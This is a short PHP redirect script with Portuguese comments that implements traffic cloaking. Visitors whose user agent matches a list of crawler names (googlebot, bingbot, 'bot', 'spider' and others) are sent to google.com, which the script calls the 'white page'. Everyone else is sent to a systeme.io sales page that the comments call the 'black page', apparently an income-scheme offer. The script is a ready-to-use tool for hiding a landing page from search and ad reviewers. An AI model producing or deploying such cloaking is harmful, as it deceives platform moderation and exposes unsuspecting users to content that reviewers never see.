<?php
// Lista básica de user agents de bots (pode expandir depois)
$bots = [
    'googlebot',
    'bingbot',
    'slurp',
    'duckduckbot',
    'baiduspider',
    'yandex',
    'sogou',
    'exabot',
    'facebot',
    'ia_archiver',
    'crawler',
    'bot',
    'spider'
];

// Pega o user agent
$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');

// Verifica se é bot por user agent
foreach ($bots as $bot) {
    if (strpos($userAgent, $bot) !== false) {
        header("Location: https://www.google.com"); // White page
        exit;
    }
}

// Se não for bot, redireciona para sua black page
header("Location: https://metodosuarenda.systeme.io/metodo");
exit;
